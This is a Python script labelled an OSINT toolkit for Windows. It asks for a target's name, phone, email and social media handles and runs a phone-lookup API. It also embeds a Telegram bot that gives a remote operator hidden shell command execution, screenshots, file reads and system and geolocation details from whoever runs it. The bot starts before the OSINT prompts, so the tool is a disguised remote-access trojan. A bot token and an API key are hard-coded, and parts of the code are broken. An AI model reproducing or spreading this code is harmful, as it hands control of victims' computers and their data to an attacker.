from colorama import Fore, Style, init
from datetime import datetime
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackContext, \
    ConversationHandler
import threading
import pyautogui
import subprocess
import locale
import psutil
import platform
import socket
import os

init()

print(Fore.LIGHTBLUE_EX, "|------OSINT TOOLKIT------|")
print(Fore.LIGHTGREEN_EX, "|-----Windows edition-----|")
print(Fore.LIGHTGREEN_EX, datetime.now())
print("")

TOKEN = "8399893129:AAHzzIgtktJya0iX0SEqwrzS_B6sBtGrmrE"

print(Fore.LIGHTMAGENTA_EX , "Always enter 1 if detail is unknown. ")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    time = datetime.today()
    user = os.getlogin()

    await update.message.reply_text("Hello friend..\n")
    await update.message.reply_text(f"Running on: {user}, Time is: {time}\n")
    await update.message.reply_text(
        "Commands (/):\n"
        "|-----------------------|\n"
        "-> screenshot\n"
        "-> ipconfig\n"
        "-> whoami\n"
        "-> shell\n"
        "-> download\n"
        "-> upload\n"
        "-> logger\n"
        "-> shell"
    )
async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    path = " ".join(context.args)
    if not path:
        await update.message.reply_text("Usage: /download <path>")
        return
    await update.message.reply_text(open(path, "rb"))

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pyautogui.screenshot().save("screenshot.png")
    with open("Screenshot.png", "rb") as file:
        await update.message.reply_document(file)

async def ipconfig(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import subprocess
    cmd = 0x08000000
    result = subprocess.run(["ipconfig"], capture_output=True, text=True, shell=True, creationflags=cmd)

    output = result.stdout.strip()
    await update.message.reply_text(output)

async def whoami(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = requests.get("http://ip-api.com/json").json()
    os_name = platform.system()
    os_version = platform.release()
    user = os.getlogin()
    cpu = platform.processor()
    date = datetime.now()

    message = (
        "whoami\n"
       "----------------------\n"
        f"IP: {data['query']}\n"
        f"Country: {data['country']} ({data['countryCode']})\n"
        f"Region: {data['regionName']}\n"
        f"City: {data['city']}\n"
        f"ISP: {data['isp']}\n"
        f"ASN: {data['as']}\n"
        f"OS: {os_name}\n"
        f"OS-version: {os_version}\n"
        f"User: {user}\n"
        f"CPU: {cpu}\n"
        f"Date: {date}\n"
    )
    await update.message.reply_text(message)

CREATE_NO_WINDOW = 0x08000000
async def shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = " ".join(context.args)
    if not command:
        await update.message.reply_text("Usage: /shell <command> (e.g., dir %USERPROFILE%\\Downloads)")
        return
    result = subprocess.run(command, capture_output=True, shell=True, creationflags=CREATE_NO_WINDOW, encoding="utf-8", errors="replace")
    output = (result.stdout or "").strip()
    error = (result.stderr or "").strip()
    if not output and not error:
        output = "Command executed successfully (no output)."
    elif error:
        output += f"\n[Error]:\n{error}"
    file_path = "cmd_output.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(output)
    await update.message.reply_document(open(file_path, "rb"))

def run_bot():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("screenshot", screenshot))
    app.add_handler(CommandHandler("whoami", whoami))
    app.add_handler(CommandHandler("shell", shell))
    app.run_polling()
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

run_bot()

print(Fore.RESET, "[+] Target's name:")
name = input()
if name == "1":
    b_name = False

print("[+] Phone number (with country code, eg: +7): ")
phone = input()
if phone == "1":
    b_phone = False

print("[+] email address: ")
email = input()
if email == "1":
    b_email = False

print(Fore.LIGHTMAGENTA_EX, "Any known social media accounts? (eg: tiktok, telegram etc..): ")
print(Fore.LIGHTMAGENTA_EX, "Always enter username, not display name, with @, (eg: @Zabroshka): ")

print(Fore.RESET, "Telegram: ")
telegram = input()
if telegram == "1":
    b_telegram = False

print("Tiktok: ")
tiktok = input()
if tiktok == "1":
    b_tiktok = False

print("Vkontakte (VK): ")
vkontakte = input()
if vkontakte == "1":
    1 == "unknown"
    b_vkontakte = False

print("Instagram: ")
instagram = input()
if instagram == "1":
    b_instagram = False

print("Discord: ")
discord = input()
if discord == "1":
    b_discord = False

inf_array = [name, phone, email, telegram, tiktok, vkontakte, instagram, discord]

print(Fore.LIGHTMAGENTA_EX, "OK, this is the information you entered: ")
print("")
print(Fore.LIGHTBLUE_EX, "Identity profile:")
for i in range(7):
    print(Fore.LIGHTBLUE_EX, (i+1), ";", inf_array[i])
print("")
print(Fore.LIGHTMAGENTA_EX, "Starting deep web scan... Please wait...")

def phonechecker(phone):

    API_KEY = "2k6pnpzyDqa7wAOJEgfpP8A8cIonCMXJ4IT0dvpg"
    url = "https://api.trestleiq.com/3.0/phone_intel"
    headers = {"x-api-key": API_KEY}
    params = {"phone": phone}

    try:
        response = requests.get(url, headers=headers, params=params, timeout=10)
        data = response.json()

        phone_number = data.get('phone_number', 'N/A')
        is_valid = data.get('is_valid', 'N/A')
        activity_score = data.get('activity_score', 'N/A')
        country_code = data.get('country_code', 'N/A')
        country_name = data.get('country_name', 'N/A')
        line_type = data.get('line_type', 'N/A')
        carrier = data.get('carrier', 'N/A')
        is_prepaid = data.get('is_prepaid', 'N/A')

        return (
            f"Phone number: {phone_number}\n"
            f"Valid: {is_valid}\n"
            f"Activity score: {activity_score}\n"
            f"Country name: {country_name}\n"
            f"Line type: {line_type}\n"
            f"Carrier: {carrier}\n"
            f"Prepaid: {is_prepaid}"
        )

    except Exception as e:
        return f"Request failed: {e}"

print(Fore.LIGHTGREEN_EX, "Phone scan finished at: ", datetime.now())
print(Fore.LIGHTMAGENTA_EX, "Phone scan results, program still in development: ")
print(Fore.RESET, phonechecker(phone))

